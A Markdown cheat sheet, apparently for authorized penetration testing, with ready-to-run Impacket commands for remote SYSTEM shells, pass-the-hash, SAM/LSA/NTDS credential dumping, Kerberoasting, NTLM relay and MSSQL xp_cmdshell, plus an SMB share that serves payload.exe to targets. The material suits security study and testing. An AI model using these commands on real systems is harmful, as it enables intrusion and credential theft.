# Impacket

!!! tip "Tip"
    On Kali, use the packaged wrappers: `impacket-secretsdump`, `impacket-wmiexec`, `impacket-GetUserSPNs`, etc. Upstream help may still show the original script name in the usage line, but the Kali binaries are `impacket-<tool>`.

---
## Core Syntax

```bash
impacket-<tool> [options] [[domain/]username[:password]@]$IP
```

| Auth | Pattern |
| --- | --- |
| Domain password | `impacket-psexec '$NETBIOS/<user>:<pass>@$IP'` |
| Local password | `impacket-wmiexec '<user>:<pass>@$IP'` |
| Pass-the-hash | `impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'` |
| Kerberos ticket | `KRB5CCNAME=<user>.ccache impacket-psexec -k -no-pass '$NETBIOS/<user>@$DC_IP'` |
| AES key | `impacket-secretsdump -aesKey <aes256-key> '$NETBIOS/<user>@$DC_IP'` |

!!! warning "Watch out"
    Kerberos mode needs names, not raw IPs. Put the DC/host FQDN in `/etc/hosts`, set `KRB5CCNAME` when using a ticket, and add `-dc-ip $DC_IP` when DNS is unreliable.

---
## SMB / File Ops

### Enumerate shares

```bash
impacket-smbclient '$NETBIOS/<user>:<pass>@$IP'
```

```text
# shares
# use SYSVOL
# ls
# get Policies/{GUID}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf
# exit
```

### Run scripted SMB client commands

```bash
printf 'shares\nuse C$\nget Users\\Public\\loot.txt loot.txt\nexit\n' > smb.cmds
impacket-smbclient -inputfile smb.cmds '$NETBIOS/<user>:<pass>@$IP'
```

### Host files

```bash
impacket-smbserver PWN /home/user/payloads -smb2support

# Target: copy \\$LHOST\PWN\payload.exe C:\Temp\payload.exe
```

---
## Remote Execution

| Tool | Use | Notes |
| --- | --- | --- |
| `impacket-psexec` | Interactive shell as `SYSTEM` | Uploads/starts a temporary service; reliable and noisy. |
| `impacket-smbexec` | Semi-interactive shell as `SYSTEM` | Service-based; useful when `psexec` is blocked. |
| `impacket-wmiexec` | Semi-interactive shell as the supplied user | WMI/DCOM; no service creation, still creates process telemetry. |
| `impacket-dcomexec` | Semi-interactive shell as the supplied user | DCOM object execution; try when WMI behavior is filtered. |
| `impacket-atexec` | One-shot command as `SYSTEM` | Scheduled task execution; good for a single command. |

### PSExec

```bash
impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP'
impacket-psexec -hashes :<ntlm-hash> '$NETBIOS/Administrator@$IP'
impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP' 'whoami'
```

### WMIExec

```bash
impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP'
impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'
impacket-wmiexec -shell-type powershell '$NETBIOS/<user>:<pass>@$IP'
impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP' 'ipconfig /all'
```

### Alternate exec methods

```bash
impacket-smbexec '$NETBIOS/Administrator:Passw0rd@$IP'
impacket-atexec '$NETBIOS/Administrator:Passw0rd@$IP' 'whoami'
impacket-dcomexec '$NETBIOS/Administrator:Passw0rd@$IP'
```

---
## Credential Dumping

### Remote and offline dumps

```bash
# Remote SAM/LSA/NTDS where permitted
impacket-secretsdump '$NETBIOS/Administrator:Passw0rd@$IP'

# Pass-the-hash
impacket-secretsdump -hashes :<ntlm-hash> '$NETBIOS/Administrator@$IP'

# DC-only DRSUAPI dump
impacket-secretsdump -just-dc '$NETBIOS/Administrator:Passw0rd@$DC_IP'

# Domain NTLM hashes only
impacket-secretsdump -just-dc-ntlm '$NETBIOS/Administrator:Passw0rd@$DC_IP'

# Offline SAM/SYSTEM/SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Offline NTDS.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Lightweight enumeration

```bash
impacket-samrdump '$NETBIOS/<user>:<pass>@$DC_IP'
impacket-lookupsid '$NETBIOS/<user>:<pass>@$DC_IP'
impacket-lookupsid '$NETBIOS/<user>:<pass>@$DC_IP' 4000
impacket-netview -target $IP '$NETBIOS/<user>:<pass>'
```

---
## Kerberos

### AS-REP roasting

```bash
# No credentials, with a user list
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep.hash

# Valid domain credentials
impacket-GetNPUsers $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -format hashcat -outputfile asrep.hash
```

### Kerberoasting

```bash
impacket-GetUserSPNs $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -outputfile tgs.hash
impacket-GetUserSPNs -k -no-pass $DOMAIN/<user> -dc-ip $DC_IP -request -outputfile tgs.hash
```

### Ticket ops

```bash
impacket-getTGT $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
impacket-getTGT -hashes :<ntlm-hash> $DOMAIN/<user> -dc-ip $DC_IP
impacket-getTGT -aesKey <aes256-key> $DOMAIN/<user> -dc-ip $DC_IP

impacket-getST -spn cifs/$DC_IP -impersonate Administrator $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
impacket-ticketConverter ticket.kirbi ticket.ccache
```

`impacket-ticketer` can forge tickets in specific key-compromise scenarios. Do not run it from a copied snippet; verify the SID, key material, SPN, and PAC requirements first.

---
## NTLM Relay

### Relay captured auth

```bash
impacket-ntlmrelayx -t smb://$IP -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

### LDAP relay primitives

```bash
impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --dump-laps
impacket-ntlmrelayx -t ldaps://$DC_IP -smb2support --delegate-access
impacket-ntlmrelayx -t http://ca.$DOMAIN/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

!!! warning "Watch out"
    Relay needs a target that does not require signing or channel binding for the protocol you are attacking. Generate target lists with NetExec, then feed full URLs such as `smb://host`, `ldap://dc`, or `http://ca/certsrv/` to `-t` or `-tf`.

---
## MSSQL

```bash
# SQL auth
impacket-mssqlclient 'sa:Passw0rd@$IP'

# Windows auth
impacket-mssqlclient -windows-auth '$NETBIOS/<user>:<pass>@$IP'

# Non-standard port
impacket-mssqlclient -port 14330 'sa:Passw0rd@$IP'
```

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

---
## High-Value Tools

```text
impacket-smbclient       SMB mini-shell
impacket-smbserver       temporary SMB share
impacket-psexec          service-based SYSTEM shell
impacket-wmiexec         WMI/DCOM semi-interactive shell
impacket-smbexec         service-based semi-interactive shell
impacket-atexec          scheduled task command execution
impacket-dcomexec        DCOM semi-interactive shell
impacket-secretsdump     SAM/LSA/NTDS dumping
impacket-samrdump        SAMR user enumeration
impacket-lookupsid       SID/RID enumeration
impacket-netview         host/session/share enumeration
impacket-GetNPUsers      AS-REP roasting
impacket-GetUserSPNs     Kerberoasting
impacket-getTGT          request TGT
impacket-getST           request service ticket / S4U flows
impacket-ntlmrelayx      NTLM relay
impacket-mssqlclient     MSSQL shell
```

---
## Cheatsheet

| Task | Command |
| --- | --- |
| SMB shell | `impacket-smbclient '$NETBIOS/<user>:<pass>@$IP'` |
| Host payloads | `impacket-smbserver PWN /home/user/payloads -smb2support` |
| PSExec shell | `impacket-psexec '$NETBIOS/Administrator:Passw0rd@$IP'` |
| WMIExec shell | `impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP'` |
| WMIExec command | `impacket-wmiexec '$NETBIOS/<user>:<pass>@$IP' 'whoami'` |
| Pass-the-hash shell | `impacket-wmiexec -hashes :<ntlm-hash> '$NETBIOS/<user>@$IP'` |
| Dump secrets | `impacket-secretsdump '$NETBIOS/Administrator:Passw0rd@$IP'` |
| Offline SAM dump | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
| AS-REP roast | `impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep.hash` |
| Kerberoast | `impacket-GetUserSPNs $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -outputfile tgs.hash` |
| NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support -i` |
| MSSQL shell | `impacket-mssqlclient -windows-auth '$NETBIOS/<user>:<pass>@$IP'` |

---
## Operator Workflow

```text
[0] Validate creds with NetExec.
 |
[1] Use impacket-smbclient for quick share inspection.
 |
[2] If local admin: try impacket-wmiexec first, then impacket-psexec/smbexec/atexec.
 |
[3] Dump with impacket-secretsdump only when scope and privileges justify it.
 |
[4] Run impacket-GetNPUsers / impacket-GetUserSPNs for Kerberos roast paths.
 |
[5] Build relay targets with NetExec, then run impacket-ntlmrelayx.
 |
[6] Convert/request tickets as needed; keep hostnames and Kerberos config clean.
```

!!! note "From the lab"
    Most failed Impacket Kerberos runs are name-resolution problems, not bad tickets. Use FQDN targets, set `KRB5CCNAME`, and add `-target-ip` or `-dc-ip` instead of swapping back to NTLM too early.
